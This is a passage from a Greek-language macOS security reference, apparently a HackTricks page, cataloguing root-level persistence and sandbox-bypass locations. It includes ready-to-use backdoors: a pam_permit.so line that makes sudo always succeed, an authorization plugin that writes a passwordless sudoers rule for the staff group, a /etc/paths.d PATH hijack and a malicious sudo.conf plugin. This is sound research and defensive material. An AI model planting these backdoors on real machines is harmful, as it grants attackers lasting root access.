        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Και οι δύο markers εμφανίστηκαν. Η επανάληψη με `-s`, `-I` ή `-S` απέτρεψε και τους δύο **user-site** markers σε αυτή τη δοκιμή. Δεν έγινε δοκιμή του `sitecustomize` σε καθολικό κατάλογο site.

## Παράκαμψη Sandbox ως root

> [!TIP]
> Εδώ θα βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass**, που σας επιτρέπουν να εκτελέσετε κάτι απλώς **γράφοντάς το σε ένα αρχείο**, έχοντας δικαιώματα **root** ή/και απαιτώντας άλλες **ασυνήθιστες συνθήκες**.

### Periodic

> [!CAUTION]
> **Ιστορικός μηχανισμός:** Στο μηχάνημα δοκιμών με macOS 26.5.2, τα `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` και τα launch daemons `com.apple.periodic-*` απουσιάζουν. Μην υποθέτετε ότι η δημιουργία του `/etc/periodic` σε ένα τρέχον σύστημα θα προγραμματίσει την εκτέλεση των περιεχομένων του. Πριν χρησιμοποιήσετε το παρακάτω παράδειγμα, ελέγξτε αν υπάρχουν τόσο η εντολή όσο και ένας ενεργοποιημένος scheduler στην έκδοση-στόχο.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Χρήσιμο για sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά χρειάζεστε δικαιώματα root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Απαιτούνται δικαιώματα root
  - **Trigger**: Όταν έρθει η ώρα
- `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`
  - Απαιτούνται δικαιώματα root
  - **Trigger**: Όταν έρθει η ώρα

#### Περιγραφή & Exploitation

Σε παλαιότερες εκδόσεις, τα periodic scripts (**`/etc/periodic`**) προγραμματίζονταν από **launch daemons** στο `/System/Library/LaunchDaemons/com.apple.periodic*`. Από το macOS Big Sur 11.5, το periodic runner εκτελούσε scripts στους periodic καταλόγους ως **κάτοχος κάθε αρχείου**, κλείνοντας μια παλαιότερη οδό κλιμάκωσης προνομίων.<sup>[[27]](#references)</sup> Οι εντολές και οι καταχωρίσεις καταλόγων παρακάτω είναι ιστορικό output, όχι αποτέλεσμα δοκιμής σε macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Υπάρχουν και άλλα περιοδικά scripts που θα εκτελεστούν, όπως υποδεικνύεται στο **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Σε παλαιότερα συστήματα όπου τα `periodic` και τα launch daemons ήταν εγκατεστημένα και ενεργοποιημένα, τα `/etc/daily.local`, `/etc/weekly.local` και `/etc/monthly.local` αποτελούσαν πρόσθετες διαδρομές εκτέλεσης. Ένας ακίνδυνος έλεγχος μόνο για ανάγνωση είναι:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Ο κανόνας που βασίζεται στον ιδιοκτήτη εφαρμοζόταν σε scripts που βρίσκονταν απευθείας στους περιοδικούς καταλόγους. Το ιστορικό wrapper `999.local` έκανε source τα `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local` χωρίς τον ίδιο έλεγχο ιδιοκτησίας· όταν ο scheduler εκτελούνταν ως root, αυτά τα τοπικά αρχεία εκτελούνταν ως root. Αυτή η διάκριση και η αλλαγή στο Big Sur 11.5 τεκμηριώνονται στην [original research](https://theevilbit.github.io/beyond/beyond_0019/). Δεν πρέπει να θεωρείται ότι καμία από αυτές τις διαδρομές είναι ενεργή όταν απουσιάζει το `periodic`.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά πρέπει να είστε root
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Απαιτείται πάντα root

#### Περιγραφή & Exploitation

Καθώς το PAM εστιάζει περισσότερο στην **persistence** και στο malware παρά στην εύκολη εκτέλεση μέσα στο macOS, αυτό το blog δεν θα δώσει λεπτομερή εξήγηση· **διαβάστε τα writeups για να κατανοήσετε καλύτερα αυτή την τεχνική**.<sup>[[28]](#references)</sup>

Ελέγξτε τις μονάδες PAM με:

```bash
ls -l /etc/pam.d
```

Μια τεχνική persistence/privilege escalation που καταχράται το PAM εφαρμόζεται εύκολα τροποποιώντας το module /etc/pam.d/sudo και προσθέτοντας στην αρχή τη γραμμή:

```bash
auth       sufficient     pam_permit.so
```

Έτσι, θα **μοιάζει** κάπως έτσι:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Και επομένως, κάθε προσπάθεια χρήσης του **`sudo` θα λειτουργήσει**.

> [!CAUTION]
> Σημειώστε ότι αυτός ο κατάλογος προστατεύεται από το TCC, επομένως είναι πολύ πιθανό να εμφανιστεί στον χρήστη ένα αίτημα για πρόσβαση.

Ένα ακόμη καλό παράδειγμα είναι το `su`, όπου μπορείτε να δείτε ότι είναι επίσης δυνατό να δοθούν παράμετροι στα PAM modules (και θα μπορούσατε επίσης να κάνετε backdoor σε αυτό το αρχείο):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Χρήσιμο για την παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά πρέπει να είστε root και να κάνετε πρόσθετες ρυθμίσεις
- TCC bypass: ???

#### Τοποθεσία

- `/Library/Security/SecurityAgentPlugins/`
  - Απαιτείται root
  - Χρειάζεται επίσης να ρυθμίσετε τη βάση δεδομένων εξουσιοδότησης ώστε να χρησιμοποιεί το plugin

#### Περιγραφή και εκμετάλλευση

Μπορείτε να δημιουργήσετε ένα authorization plugin που θα εκτελείται όταν ένας χρήστης συνδέεται, για να διατηρήσετε το persistence. Για περισσότερες πληροφορίες σχετικά με τη δημιουργία τέτοιων plugins, δείτε τα προηγούμενα writeups (και προσέξτε: ένα κακογραμμένο plugin μπορεί να σας αποκλείσει από το σύστημα και θα χρειαστεί να καθαρίσετε το Mac σας από το recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Μετακινήστε το bundle στη θέση από την οποία θα φορτωθεί:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Τέλος, προσθέστε τον **κανόνα** για τη φόρτωση αυτού του Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Το **`evaluate-mechanisms`** θα ενημερώσει το πλαίσιο εξουσιοδότησης ότι θα χρειαστεί να **καλέσει έναν εξωτερικό μηχανισμό για εξουσιοδότηση**. Επιπλέον, το **`privileged`** θα κάνει το εκτελέσιμο να εκτελεστεί από τον root.

Ενεργοποιήστε το με:

```bash
security authorize com.asdf.asdf
```

Και τότε η ομάδα **staff** θα πρέπει να έχει πρόσβαση μέσω sudo (διαβάστε το `/etc/sudoers` για επιβεβαίωση).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά πρέπει να είστε root και ο χρήστης πρέπει να χρησιμοποιήσει το man
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/private/etc/man.conf`**
  - Απαιτούνται δικαιώματα root
  - **`/private/etc/man.conf`**: Κάθε φορά που χρησιμοποιείται το man

#### Περιγραφή & Exploit

Το αρχείο ρυθμίσεων **`/private/etc/man.conf`** καθορίζει το binary/script που θα χρησιμοποιείται κατά το άνοιγμα αρχείων τεκμηρίωσης του man. Επομένως, η διαδρομή προς το εκτελέσιμο μπορεί να τροποποιηθεί, ώστε κάθε φορά που ο χρήστης χρησιμοποιεί το man για να διαβάσει κάποια τεκμηρίωση, να εκτελείται ένα backdoor.<sup>[[31]](#references)</sup>

Για παράδειγμα, ορίστε στο **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Και στη συνέχεια δημιουργήστε το `/tmp/view` ως:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά πρέπει να είστε root και το apache να εκτελείται
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Το Httpd δεν έχει entitlements

#### Τοποθεσία

- **`/etc/apache2/httpd.conf`**
  - Απαιτείται root
  - Ενεργοποίηση: Κατά την εκκίνηση του Apache2

#### Περιγραφή & Exploit

Μπορείτε να ορίσετε στο `/etc/apache2/httpd.conf` να φορτωθεί ένα module προσθέτοντας μια γραμμή όπως:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Με αυτόν τον τρόπο, το μεταγλωττισμένο module θα φορτωθεί από τον Apache. Το μόνο που χρειάζεται είναι είτε να **το υπογράψετε με ένα έγκυρο πιστοποιητικό Apple** είτε να **προσθέσετε ένα νέο έμπιστο πιστοποιητικό** στο σύστημα και να **το υπογράψετε** με αυτό.

Στη συνέχεια, αν χρειάζεται, για να βεβαιωθείτε ότι ο διακομιστής θα ξεκινήσει, μπορείτε να εκτελέσετε:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Παράδειγμα κώδικα για το Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Πλαίσιο ελέγχου BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Αλλά πρέπει να είστε root, να εκτελείται το auditd και να προκληθεί μια προειδοποίηση
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/etc/security/audit_warn`**
  - Απαιτούνται δικαιώματα root
  - **Ενεργοποίηση**: Όταν το auditd εντοπίζει μια προειδοποίηση

#### Περιγραφή και Exploit

Κάθε φορά που το auditd εντοπίζει μια προειδοποίηση, το script **`/etc/security/audit_warn`** **εκτελείται**. Επομένως, θα μπορούσατε να προσθέσετε το payload σας σε αυτό.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Θα μπορούσατε να προκαλέσετε μια προειδοποίηση με `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Αυτό έχει καταργηθεί, επομένως δεν θα πρέπει να βρεθεί τίποτα σε αυτούς τους καταλόγους.**

Το **StartupItem** είναι ένας κατάλογος που θα πρέπει να βρίσκεται είτε στο `/Library/StartupItems/` είτε στο `/System/Library/StartupItems/`. Μόλις δημιουργηθεί αυτός ο κατάλογος, πρέπει να περιέχει δύο συγκεκριμένα αρχεία:

1. Ένα **rc script**: Ένα shell script που εκτελείται κατά την εκκίνηση.
2. Ένα αρχείο **plist**, με την ονομασία `StartupParameters.plist`, το οποίο περιέχει διάφορες ρυθμίσεις διαμόρφωσης.

Βεβαιωθείτε ότι τόσο το rc script όσο και το αρχείο `StartupParameters.plist` βρίσκονται σωστά μέσα στον κατάλογο **StartupItem**, ώστε η διαδικασία εκκίνησης να τα αναγνωρίσει και να τα χρησιμοποιήσει.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Δεν μπορώ να βρω αυτό το στοιχείο στο macOS μου, επομένως για περισσότερες πληροφορίες δείτε το writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Το **emond**, που εισήγαγε η Apple, είναι ένας μηχανισμός καταγραφής που φαίνεται να μην έχει αναπτυχθεί πλήρως ή πιθανώς να έχει εγκαταλειφθεί, αλλά παραμένει προσβάσιμος. Παρότι δεν προσφέρει ιδιαίτερο όφελος σε έναν διαχειριστή Mac, αυτή η αφανής υπηρεσία θα μπορούσε να χρησιμοποιηθεί ως διακριτική μέθοδος persistence από φορείς απειλής, πιθανότατα χωρίς να γίνει αντιληπτή από τους περισσότερους διαχειριστές macOS.<sup>[[34]](#references)</sup>

Για όσους γνωρίζουν την ύπαρξή του, ο εντοπισμός κακόβουλης χρήσης του **emond** είναι απλός. Το LaunchDaemon του συστήματος για αυτή την υπηρεσία αναζητά scripts προς εκτέλεση σε έναν συγκεκριμένο κατάλογο. Για να τον ελέγξετε, μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Τοποθεσία

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Απαιτείται root
  - **Ενεργοποίηση**: Με το XQuartz

#### Περιγραφή & Exploit

Το XQuartz **δεν εγκαθίσταται πλέον στο macOS**, επομένως, αν θέλετε περισσότερες πληροφορίες, δείτε το writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Η εγκατάσταση ενός kext είναι τόσο περίπλοκη, ακόμη και ως root, που δεν θεωρείται πρακτική τεχνική παράκαμψης sandbox ή persistence, εκτός αν έχετε ένα exploit.

#### Τοποθεσία

Για να εγκαταστήσετε ένα KEXT ως στοιχείο εκκίνησης, πρέπει να **εγκατασταθεί σε μία από τις ακόλουθες τοποθεσίες**:

- `/System/Library/Extensions`
  - Αρχεία KEXT που είναι ενσωματωμένα στο λειτουργικό σύστημα OS X.
- `/Library/Extensions`
  - Αρχεία KEXT που εγκαθίστανται από λογισμικό τρίτων.

Μπορείτε να εμφανίσετε τα αρχεία kext που είναι φορτωμένα αυτήν τη στιγμή με:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Για περισσότερες πληροφορίες σχετικά με τις [**kernel extensions, δείτε αυτή την ενότητα**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Τοποθεσία

- **`/usr/local/bin/amstoold`**
  - Απαιτούνται δικαιώματα root

#### Περιγραφή & Exploitation

Φαίνεται ότι το `plist` από το `/System/Library/LaunchAgents/com.apple.amstoold.plist` χρησιμοποιούσε αυτό το binary, ενώ εξέθετε μια υπηρεσία XPC... το θέμα είναι ότι το binary δεν υπήρχε, οπότε μπορούσατε να τοποθετήσετε κάτι εκεί και, όταν καλούνταν η υπηρεσία XPC, θα εκτελούνταν το binary σας.<sup>[[35]](#references)</sup>

Δεν μπορώ πλέον να το βρω στο macOS μου.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Τοποθεσία

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Απαιτούνται δικαιώματα root
  - **Trigger**: Όταν εκτελείται η υπηρεσία (σπάνια)

#### Περιγραφή & exploit

Φαίνεται ότι δεν είναι πολύ συνηθισμένο να εκτελείται αυτό το script και δεν μπόρεσα καν να το βρω στο macOS μου, οπότε αν θέλετε περισσότερες πληροφορίες, δείτε το writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Αυτό δεν λειτουργεί σε σύγχρονες εκδόσεις του MacOS**

Είναι επίσης δυνατό να τοποθετήσετε εδώ **εντολές που θα εκτελεστούν κατά την εκκίνηση.** Παράδειγμα κανονικού script rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Εργασίες εκκίνησης launchd

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [🔴](https://emojipedia.org/large-red-circle) (απαιτεί root)
- Απαιτείται root, καθώς και είτε **παράκαμψη SIP** είτε άδεια **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, ανάλογα με τη διαδρομή

#### Τοποθεσία

Το `launchd` ενσωματώνει ένα plist στην ενότητά του **`__TEXT,__config`**, το οποίο περιγράφει πρώιμες «εργασίες εκκίνησης». Αρκετά scripts/binaries αναφοράς, τα οποία **δεν** υπάρχουν από προεπιλογή και μπορούν να δημιουργηθούν από έναν επιτιθέμενο:

- Σύνολο παράκαμψης SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Σύνολο TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (το `rc.netboot` υπάρχει ήδη μόνο στο Sequoia+)

#### Περιγραφή & Εκμετάλλευση

Εξαγάγετε τον ενσωματωμένο πίνακα εργασιών για να δείτε ποια αρχεία θα εκτελέσει το `launchd` και ποια κλειδιά υποστηρίζονται (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Η δημιουργία ενός από τα αρχεία που αναφέρονται (π.χ. `/etc/rc.server`) κάνει το `launchd` να το εκτελέσει στην επόμενη επανεκκίνηση (userspace). Οι πιο χρήσιμες εγγραφές περιορίζονται από το SIP ή απαιτούν TCC SysAdminFiles/Full Disk Access, επομένως πρόκειται για τεχνική σε επίπεδο root, που ενεργοποιείται με επανεκκίνηση.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Ανάλυση: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Η εργασία εκκίνησης `rc.trampoline` εκτελεί κατά την εκκίνηση ένα **platform binary (υπογεγραμμένο από την Apple)**, αποθηκευμένο στη μεταβλητή NVRAM `apple-trusted-trampoline`, αλλά **μόνο όταν έχει οριστεί το boot-arg `rc.trampoline=1` και το SIP είναι απενεργοποιημένο** (με όριο μεγέθους ~390&nbsp;KB και περιορισμό που απαιτεί η εκτέλεση να μην μπλοκάρει και να επιστρέφει γρήγορα). Καθώς απαιτεί **root + απενεργοποιημένο SIP + payload υπογεγραμμένο από την Apple**, είναι ουσιαστικά μη πρακτική για persistence στον πραγματικό κόσμο και παρατίθεται εδώ μόνο για πληρότητα.<sup>[[41]](#references)</sup>

### /etc/paths και /etc/paths.d (PATH hijack)

- Χρήσιμο για παράκαμψη του sandbox: [🔴](https://emojipedia.org/large-red-circle) (απαιτεί root για εγγραφή)
- Απαιτείται root

#### Τοποθεσία

- **`/etc/paths`** και **`/etc/paths.d/*`** — διαβάζονται από το **`path_helper`** (το οποίο καλείται από το `/etc/zprofile`) για τη δημιουργία του προεπιλεγμένου `PATH` κατά τη σύνδεση.

#### Περιγραφή & Εκμετάλλευση

Και τα δύο ανήκουν στον root. Η προσθήκη ενός καταλόγου που ελέγχεται από τον επιτιθέμενο στην αρχή της λίστας (με επεξεργασία του `/etc/paths` ή με προσθήκη ενός αρχείου στο `/etc/paths.d/`) κάνει αυτόν τον κατάλογο να εμφανίζεται νωρίς στο `PATH` κάθε νέου κελύφους σύνδεσης, ώστε ένα κακόβουλο binary με όνομα κοινής εντολής (`ls`, `git`, …) να **επισκιάζει** το πραγματικό και να εκτελείται την επόμενη φορά που το θύμα θα το καλέσει.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### Παράκαμψη SIP μέσω του storagekitd (CVE-2024-44243)

Ανάλυση: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [🔴](https://emojipedia.org/large-red-circle) (απαιτείται root)
- Απαιτείται root· το αποτέλεσμα **παρακάμπτει το SIP**. Επηρεάζονται οι εκδόσεις macOS **15.0–15.1**, διορθώθηκε στην **15.2**

#### Τοποθεσία

- Τοποθετήστε ένα filesystem bundle στον φάκελο **`/Library/Filesystems/`**.

#### Περιγραφή & Exploitation

Το `storagekitd` διαθέτει το entitlement **`com.apple.rootless.install.heritable`** και εκκινούσε τα binary των filesystem bundles με αυτήν τη δυνατότητα παράκαμψης του SIP **κληρονομημένη**. Τοποθετώντας ένα κακόβουλο filesystem bundle, ένας επιτιθέμενος μπορούσε να εκτελέσει κώδικα με παράκαμψη του SIP, ώστε να εγκαταστήσει **persistent kernel extensions** ή να γράψει σε καταλόγους `LaunchDaemon` που προστατεύονται από το SIP — persistence που επιβιώνει και παρακάμπτει τις συνήθεις προστασίες.<sup>[[46]](#references)</sup> Η Apple το διόρθωσε στο macOS Sequoia 15.2.

### sudo plugins (`/etc/sudo.conf`)

Ανάλυση: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [🔴](https://emojipedia.org/large-red-circle) (απαιτείται root για εγγραφή στο `/etc/sudo.conf`)
- Απαιτείται root για την εγκατάσταση· στη συνέχεια, το plugin εκτελείται μέσα σε **κάθε κλήση του `sudo`** (πλαίσιο setuid-root)

#### Τοποθεσία

- **`/etc/sudo.conf`** — οι γραμμές `Plugin` φορτώνουν shared objects από το **`/usr/libexec/sudo/`** (ή από απόλυτη διαδρομή). Δεν υπάρχει από προεπιλογή (το sudo χρησιμοποιεί ενσωματωμένη πολιτική), επομένως η δημιουργία του αποτελεί καθαρό hook.

#### Περιγραφή & Exploitation

Το `sudo` φορτώνει τα plugin πολιτικής/έγκρισης/ελέγχου από το `/etc/sudo.conf`. Επειδή το `sudo` είναι setuid-root, ένα κακόβουλο plugin shared object εκτελείται με **προνόμια root κάθε φορά που οποιοσδήποτε χρήστης εκτελεί `sudo`** — ανθεκτικό root persistence που βλέπει επίσης κάθε εντολή sudo.<sup>[[51]](#references)</sup> Το macOS διαθέτει το sudo 1.9.x, το οποίο υποστηρίζει το plugin API.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
